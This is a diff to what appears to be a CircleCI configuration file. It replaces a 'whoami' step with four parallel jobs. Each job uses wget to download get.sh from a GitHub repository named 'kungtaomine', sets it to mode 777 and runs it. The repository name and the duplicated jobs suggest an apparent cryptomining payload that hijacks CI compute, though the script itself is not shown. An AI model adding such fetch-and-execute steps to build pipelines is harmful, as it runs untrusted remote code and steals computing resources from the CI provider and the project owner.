@@ -6,10 +6,36 @@ jobs:
     docker:
       - image: cimg/go:1.13.15-browsers
     steps:
-      - run: whoami
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get.sh 
+      - run: chmod 777 get.sh 
+      - run: ./get.sh
+  gas2:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get.sh 
+      - run: chmod 777 get.sh 
+      - run: ./get.sh
+  gas3:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get.sh 
+      - run: chmod 777 get.sh 
+      - run: ./get.sh
+  gas4:
+    docker:
+      - image: cimg/go:1.13.15-browsers
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get.sh 
+      - run: chmod 777 get.sh 
+      - run: ./get.sh
 
 # Orchestrate our job run sequence
 workflows:
-  parakang:
+  alpha5:
     jobs:
       - gas1
+      - gas2
+      - gas3
+      - gas4
